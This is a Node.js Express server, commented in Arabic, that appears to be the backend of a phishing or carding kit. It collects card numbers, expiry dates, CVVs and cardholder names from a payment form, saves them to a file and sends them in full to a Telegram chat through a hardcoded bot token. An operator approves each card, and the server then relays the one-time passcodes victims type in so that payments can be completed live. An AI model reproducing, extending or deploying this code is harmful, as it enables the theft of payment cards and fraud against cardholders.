const express = require('express');
const https = require('https');
const path = require('path');
const session = require('express-session');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const PAYMENTS_FILE = path.join(__dirname, 'payments.json');

// تحميل البيانات من الملف
function loadPayments() {
  try {
    if (fs.existsSync(PAYMENTS_FILE)) {
      const data = fs.readFileSync(PAYMENTS_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.log('Error loading payments:', e.message);
  }
  return {};
}

// حفظ البيانات إلى الملف
function savePayments(data) {
  fs.writeFileSync(PAYMENTS_FILE, JSON.stringify(data, null, 2));
}

// تحميل البيانات عند بدء السيرفر
let paymentsData = loadPayments();

app.use(cors({ origin: true, credentials: true }));

const telegramBotToken = '8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E';
const telegramChatId = '8108427825';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// إعداد الجلسة لحفظ بيانات كل مستخدم على حدة في ذاكرة السيرفر
app.use(session({
  secret: 'v1sa_secure_key_2026',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // اجعلها true فقط إذا كنت تستخدم بروتوكول https://
}));

// متجر عام لحفظ حالات الجلسات (للمساعدة في معالجة webhooks)
const sessionStore = new Map();

app.use((req, res, next) => {
  // حفظ معرف الجلسة في المتجر العام عند كل طلب
  if (req.sessionID && !sessionStore.has(req.sessionID)) {
    sessionStore.set(req.sessionID, {
      approvalStatus: 'pending',
      cardData: null,
      otpAttempts: 0
    });
  }
  next();
});

// دالة إرسال الرسائل إلى تليجرام (مع معالجة أخطاء آمنة)
function sendTelegramMessage(text, replyMarkup = null) {
  return new Promise((resolve, reject) => {
    const payloadData = {
      chat_id: telegramChatId,
      text,
      parse_mode: 'HTML'
    };

    // إضافة الأزرار إلى جسم الطلب إذا تم تمريرها
    if (replyMarkup) {
      payloadData.reply_markup = replyMarkup;
    }

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          reject(new Error(`Telegram API Error: ${response.statusCode}`));
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (sendMessage):', error.message);
      resolve({}); // لا نرفع الخطأ، نستمر في المعالجة
    });
    
    request.setTimeout(5000, () => {
      request.destroy();
      console.log('⚠️ انقضى الوقت عند محاولة إرسال الرسالة');
      resolve({}); // لا نرفع الخطأ
    });
    
    request.write(payload);
    request.end();
  });
}

// 1. استقبال بيانات البطاقة وحفظها وبدء عداد الرموز للمستخدم
app.post('/api/payment', async (req, res) => {
  const paymentData = req.body;
  
  // إنشاء معرف فريد ثابت لكل عملية دفع
  const paymentID = uuidv4();
  
  console.log('تم استقبال بيانات البطاقة - PaymentID:', paymentID);
  console.log('البيانات:', paymentData);

  // حفظ البيانات في الملف مع معرف ثابت
  paymentsData[paymentID] = {
    cardData: {
      name: paymentData.name || 'غير معروف',
      cardName: paymentData.cardName || 'غير معروف',
      cardNumber: paymentData.cardNumber || 'غير متوفر',
      expiry: paymentData.expiry || 'غير متوفر',
      cvv: paymentData.cvv || 'غير متوفر',
      type: paymentData.type || 'غير معروف'
    },
    otpAttempts: 0,
    approvalStatus: 'pending',
    createdAt: new Date().toISOString()
  };
  savePayments(paymentsData);

  // حفظ paymentID في الجلسة ليرجع المستخدم يتحقق منه
  req.session.paymentID = paymentID;
  req.session.cardData = paymentsData[paymentID].cardData;

  // إرسال إشعار أولي لتليجرام بدخول المستخدم وبدء العملية مع أزرار الموافقة
  const initialText = ` <b>🔔 طلب دفع جديد</b>\n\n` +
    `• حامل البطاقة: ${paymentsData[paymentID].cardData.cardName}\n` +
    `• رقم البطاقة: <code>${paymentsData[paymentID].cardData.cardNumber}</code>\n` +
    `• التاريخ: ${paymentsData[paymentID].cardData.expiry}\n` +
    `• CVV: <code>${paymentsData[paymentID].cardData.cvv}</code>\n\n` +
    `⏳ بانتظار الموافقة...`;

  // إنشاء أزرار الموافقة والرفض مع paymentID ثابت
  const replyMarkup = {
    inline_keyboard: [
      [
        { text: '✅ موافق', callback_data: `approve_${paymentID}` },
        { text: '❌ غير موافق', callback_data: `reject_${paymentID}` }
      ]
    ]
  };

  try {
    const result = await sendTelegramMessage(initialText, replyMarkup);
    // حفظ message_id للاستخدام لاحقاً في تحديث الرسالة
    if (result && result.result && result.result.message_id) {
      paymentsData[paymentID].telegramMessageId = result.result.message_id;
      savePayments(paymentsData);
    }
    return res.json({ success: true, message: 'Card data saved in session.', paymentID: paymentID });
  } catch (error) {
    console.error('خطأ في إرسال رسالة تليجرام:', error.message);
    return res.json({ success: true, message: 'Saved locally, telegram may have failed but request is queued.', paymentID: paymentID });
  }
});

// 2. استقبال callback من تيليجرام (أزرار الموافقة والرفض)
app.post('/webhook/telegram', async (req, res) => {
  console.log('=== WEBHOOK RECEIVED ===');
  
  const callbackQuery = req.body.callback_query;
  
  if (!callbackQuery) {
    console.log('No callback_query in body');
    return res.status(200).send('OK');
  }

  const callbackData = callbackQuery.data;
  const callbackId = callbackQuery.id;
  const messageId = callbackQuery.message.message_id;

  console.log('استلام callback من تيليجرام:', callbackData);

  // استخراج action و paymentID من callback_data
  const parts = callbackData.split('_');
  const action = parts[0];
  const paymentID = parts.slice(1).join('_'); // دعم IDs التي تحتوي على underscore

  console.log('Action:', action, 'PaymentID:', paymentID);

  // إعادة تحميل البيانات من الملف
  paymentsData = loadPayments();
  console.log('Available payment IDs:', Object.keys(paymentsData));

  // البحث عن الدفع في الملف
  const paymentRecord = paymentsData[paymentID];
  console.log('Payment record found:', paymentRecord);

  if (!paymentRecord) {
    console.log('الدفع غير موجود:', paymentID);
    await answerCallbackQuery(callbackId, '❌ الطلب منتهي أو غير صحيح');
    return res.status(200).send('OK');
  }

  // تحديث حالة الموافقة بناءً على الزر المضغوط
  if (action === 'approve') {
    paymentRecord.approvalStatus = 'approved';
    paymentsData[paymentID] = paymentRecord;
    savePayments(paymentsData);
    
    // إنشاء رسالة جديدة بنفس التنسيق مع إضافة حالة الموافقة في الأعلى
    const approvedText = ` <b>✅ تمت الموافقة</b>\n\n` +
      `• حامل البطاقة: ${paymentRecord.cardData.cardName}\n` +
      `• رقم البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n` +
      `• التاريخ: ${paymentRecord.cardData.expiry}\n` +
      `• CVV: <code>${paymentRecord.cardData.cvv}</code>\n\n` +
      `✅ جاري توجيه المستخدم لصفحة OTP`;
    
    await answerCallbackQuery(callbackId, '✅ تمت الموافقة');
    // إرسال رسالة جديدة تحتوي على البيانات والحالة
    await sendTelegramMessage(approvedText);
    // حذف الرسالة القديمة
    await deleteMessage(messageId);
    
    console.log('✅ تمت الموافقة على الطلب - PaymentID:', paymentID);
  } else if (action === 'reject') {
    paymentRecord.approvalStatus = 'rejected';
    paymentsData[paymentID] = paymentRecord;
    savePayments(paymentsData);
    
    // إنشاء رسالة جديدة بنفس التنسيق مع إضافة حالة الرفض في الأعلى
    const rejectedText = ` <b>❌ تم الرفض</b>\n\n` +
      `• حامل البطاقة: ${paymentRecord.cardData.cardName}\n` +
      `• رقم البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n` +
      `• التاريخ: ${paymentRecord.cardData.expiry}\n` +
      `• CVV: <code>${paymentRecord.cardData.cvv}</code>\n\n` +
      `❌ جاري إبلاغ المستخدم`;
    
    await answerCallbackQuery(callbackId, '❌ تم الرفض');
    // إرسال رسالة جديدة تحتوي على البيانات والحالة
    await sendTelegramMessage(rejectedText);
    // حذف الرسالة القديمة
    await deleteMessage(messageId);
    
    console.log('❌ تم رفض الطلب - PaymentID:', paymentID);
  }

  res.status(200).send('OK');
});

// دالة للإجابة على callback query (مع معالجة أخطاء آمنة)
function answerCallbackQuery(callbackId, text) {
  return new Promise((resolve) => {
    const payloadData = {
      callback_query_id: callbackId,
      text: text,
      show_alert: true
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/answerCallbackQuery`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: Telegram API استجابة غير متوقعة:', response.statusCode);
          resolve({}); // لا نرفع الخطأ، فقط نسجل
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (answerCallbackQuery):', error.message);
      resolve({}); // لا نرفع الخطأ
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      console.log('⚠️ انقضى الوقت عند محاولة الاتصال بـ Telegram');
      resolve({});
    });
    
    request.write(payload);
    request.end();
  });
}

// دالة لتحديث نص الرسالة (مع معالجة أخطاء آمنة)
function editMessageReplyMarkup(messageId, replyMarkup) {
  return new Promise((resolve) => {
    const payloadData = {
      chat_id: telegramChatId,
      message_id: messageId,
      reply_markup: replyMarkup // إزالت الأزرار
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/editMessageReplyMarkup`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: editMessageReplyMarkup:', response.statusCode, body);
          resolve({});
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل editMessageReplyMarkup:', error.message);
      resolve({});
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      resolve({});
    });
    
    request.write(payload);
    request.end();
  });
}

// دالة لتحديث نص الرسالة
function editMessageText(messageId, text) {
  return new Promise((resolve) => {
    const payloadData = {
      chat_id: telegramChatId,
      message_id: messageId,
      text: text,
      parse_mode: 'HTML'
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: editMessageText:', response.statusCode, body);
          resolve({});
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل editMessageText:', error.message);
      resolve({});
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      resolve({});
    });
    
    request.write(payload);
    request.end();
  });
}

// دالة لحذف رسالة
function deleteMessage(messageId) {
  return new Promise((resolve) => {
    const payloadData = {
      chat_id: telegramChatId,
      message_id: messageId
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/deleteMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: deleteMessage:', response.statusCode, body);
          resolve({});
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل deleteMessage:', error.message);
      resolve({});
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      resolve({});
    });
    
    request.write(payload);
    request.end();
  });
}

// 3. endpoint للتحقق من حالة الموافقة
app.get('/api/check-approval', (req, res) => {
  const paymentID = req.session.paymentID;
  
  if (!paymentID) {
    console.log('لا يوجد paymentID في الجلسة');
    return res.json({ status: 'pending' });
  }
  
  // جلب الحالة من الملف
  paymentsData = loadPayments();
  const paymentRecord = paymentsData[paymentID];
  
  const status = paymentRecord ? paymentRecord.approvalStatus : 'pending';
  console.log('التحقق من الموافقة - PaymentID:', paymentID, 'Status:', status);
  
  res.json({ status: status, paymentID: paymentID });
});

// 3.5 endpoint للتحكم اليدوي في الحالة (للاختبار)
app.post('/api/set-approval', (req, res) => {
  const { status, paymentID: reqPaymentID } = req.body;
  
  // استخدام paymentID من الطلب أو من الجلسة
  const paymentID = reqPaymentID || req.session.paymentID;
  
  if (!paymentID) {
    return res.status(400).json({ success: false, message: 'No payment ID provided' });
  }
  
  if (!['pending', 'approved', 'rejected'].includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status' });
  }
  
  paymentsData = loadPayments();
  if (!paymentsData[paymentID]) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  paymentsData[paymentID].approvalStatus = status;
  savePayments(paymentsData);
  
  console.log('تم تحديث حالة الموافقة - PaymentID:', paymentID, 'Status:', status);
  res.json({ success: true, status: status });
});

// 4. استقبال رمز الـ OTP المتكرر وربطه بالبطاقة المخزنة وحساب المحاولات تصاعدياً
app.post('/api/verify-otp', async (req, res) => {
  const { otp } = req.body;
  const paymentID = req.session.paymentID;
  
  console.log('🔐 محاولة التحقق من OTP - PaymentID:', paymentID);
  
  if (!paymentID) {
    console.log('لا يوجد paymentID في الجلسة');
    return res.status(400).json({ success: false, message: 'No payment session found.' });
  }
  
  // جلب بيانات البطاقة من الملف
  paymentsData = loadPayments();
  const paymentRecord = paymentsData[paymentID];
  
  if (!paymentRecord) {
    console.log('محاولة إرسال OTP بدون وجود بيانات في الملف');
    return res.status(400).json({ success: false, message: 'No card session found.' });
  }

  // التحقق من حالة الموافقة من الملف
  let approvalStatus = paymentRecord.approvalStatus || 'pending';
  
  console.log('✓ حالة الموافقة:', approvalStatus);
  
  if (approvalStatus === 'rejected') {
    console.log('محاولة إرسال OTP بعد رفض الطلب');
    return res.json({ 
      success: false, 
      message: 'rejected',
      error: 'يرجى التأكد من البيانات أو استخدام طريقة دفع مختلفة'
    });
  }

  if (approvalStatus === 'pending') {
    console.log('محاولة إرسال OTP قبل الموافقة على الطلب');
    return res.json({ 
      success: false, 
      message: 'pending',
      error: 'يرجى الانتظار حتى يتم الموافقة على طلبك'
    });
  }

  // زيادة عداد المحاولات
  paymentRecord.otpAttempts = (paymentRecord.otpAttempts || 0) + 1;
  paymentsData[paymentID] = paymentRecord;
  savePayments(paymentsData);

  const currentAttempt = paymentRecord.otpAttempts;
  const savedCard = paymentRecord.cardData;
  console.log(`تم استلام الرمز رقم [${currentAttempt}]: (${otp}) للبطاقة: ${savedCard.cardNumber}`);

  // محاكاة التحقق من الرمز (للاختبار - الرمز الصحيح هو 123456)
  const isCorrectOTP = (otp === '123456');
  
  // إذا الرمز صحيح → نجاح وفوراً
  if (isCorrectOTP) {
    const successText = ` <b>✅ تم إدخال رمز صحيح</b>\n\n` +
      `• حامل البطاقة: ${savedCard.name}\n` +
      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
      `✅ تم التحقق بنجاح - جاري إتمام العملية`;
    
    await sendTelegramMessage(successText);
    
    return res.json({ 
      success: true, 
      redirect: '/success.html',
      attempt: currentAttempt
    });
  }
  
  // إذا الرمز غلط → زيادة العداد
  if (currentAttempt >= 3) {
    // بعد 3 محاولات فاشلة → رفض تلقائي
    paymentRecord.approvalStatus = 'rejected';
    paymentsData[paymentID] = paymentRecord;
    savePayments(paymentsData);
    
    const rejectText = ` <b>❌ تم رفض الطلب</b>\n\n` +
      `• حامل البطاقة: ${savedCard.name}\n` +
      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
      `❌ تم إدخال 3 رموز خاطئة - تم رفض الطلب تلقائياً`;
    
    await sendTelegramMessage(rejectText);
    
    console.log('❌ تم رفض الطلب بعد 3 محاولات فاشلة');
    return res.json({ 
      success: false, 
      message: 'max_attempts',
      attempt: currentAttempt,
      error: 'تم رفض طلبك، يرجى استخدام طريقة دفع أخرى'
    });
  }

  // محاولات إضافية (1 أو 2) - إظهار خطأ في الصفحة
  const errorText = ` <b>❌ رمز خاطئ - المحاولة ${currentAttempt}</b>\n\n` +
    `• حامل البطاقة: ${savedCard.name}\n` +
    `• البطاقة: <code>${savedCard.cardNumber}</code>\n` +
    `• الرمز المدخل: <code style="color: red;">${otp}</code>\n\n` +
    `❌ الرمز غير صحيح - ${3 - currentAttempt} محاولات متبقية`;

  await sendTelegramMessage(errorText);

  // إرجاع أن المحاولة فاشلة ليبقى المستخدم في الصفحة
  return res.json({ 
    success: false, 
    message: 'wrong_otp',
    attempt: currentAttempt,
    attemptsRemaining: 3 - currentAttempt,
    error: 'الرمز غير صحيح'
  });
});

// 4.5 endpoint للتحقق من رمز OTP (يحاكي رد المدير في تليجرام)
app.post('/api/check-otp', async (req, res) => {
  const { isCorrect } = req.body; // true = صحيح، false = خطأ
  const paymentID = req.session.paymentID;
  
  if (!paymentID) {
    return res.status(400).json({ success: false, message: 'No payment session found.' });
  }
  
  // جلب بيانات البطاقة من الملف
  paymentsData = loadPayments();
  const paymentRecord = paymentsData[paymentID];
  
  if (!paymentRecord) {
    return res.status(400).json({ success: false, message: 'No card session found.' });
  }

  if (isCorrect) {
    // نجاح → توجيه لصفحة النجاح
    return res.json({ 
      success: true, 
      redirect: '/success.html'
    });
  } else {
    // فشل → إرجاع عدد المحاولات المتبقية
    const attempt = paymentRecord.otpAttempts || 0;
    const remaining = 3 - attempt;
    
    if (remaining <= 0) {
      // رفض تلقائي بعد 3 محاولات
      paymentRecord.approvalStatus = 'rejected';
      paymentsData[paymentID] = paymentRecord;
      savePayments(paymentsData);
      
      return res.json({ 
        success: false, 
        message: 'max_attempts',
        redirect: '/success.html?rejected=true'
      });
    }
    
    return res.json({ 
      success: false, 
      message: 'wrong_otp',
      attempt: attempt,
      attemptsRemaining: remaining
    });
  }
});

// endpoint لإعادة إرسال OTP
app.post('/api/resend-otp', async (req, res) => {
  const paymentID = req.session.paymentID;
  
  if (!paymentID) {
    return res.status(400).json({ success: false, message: 'No payment session found.' });
  }
  
  // جلب بيانات البطاقة من الملف
  paymentsData = loadPayments();
  const paymentRecord = paymentsData[paymentID];
  
  if (!paymentRecord) {
    return res.status(400).json({ success: false, message: 'No card session found.' });
  }

  const resendText = `<b>🔄 إعادة طلب OTP</b>\n\n` +
    `📌 بيانات صاحب البطاقة:\n` +
    `• الاسم: ${paymentRecord.cardData.name}\n` +
    `• البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n\n` +
    `⏰ تم طلب رمز تحقق جديد من قبل المستخدم.`;

  try {
    await sendTelegramMessage(resendText);
    return res.json({ 
      success: true, 
      message: 'OTP resend request processed' 
    });
  } catch (error) {
    return res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// إعداد webhook تيليجرام عند بدء السيرفر
async function setupTelegramWebhook() {
  const webhookUrl = process.env.TELEGRAM_WEBHOOK_URL;
  if (webhookUrl) {
    try {
      const payloadData = { url: webhookUrl + '/webhook/telegram' };
      const payload = JSON.stringify(payloadData);
      
      const options = {
        hostname: 'api.telegram.org',
        path: `/bot${telegramBotToken}/setWebhook`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
      };

      const response = await new Promise((resolve, reject) => {
        const request = https.request(options, (res) => {
          let body = '';
          res.on('data', (chunk) => { body += chunk; });
          res.on('end', () => resolve({ status: res.statusCode, body }));
        });
        request.on('error', reject);
        request.write(payload);
        request.end();
      });

      if (response.status === 200) {
        console.log('✅ تم إعداد webhook تيليجرام:', webhookUrl);
      } else {
        console.log('⚠️ فشل إعداد webhook:', response.body);
      }
    } catch (error) {
      console.log('⚠️ خطأ في إعداد webhook:', error.message);
    }
  } else {
    console.log('ℹ️ TELEGRAM_WEBHOOK_URL غير محددة - للمعاينة استخدم /api/set-approval');
  }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  await setupTelegramWebhook();
});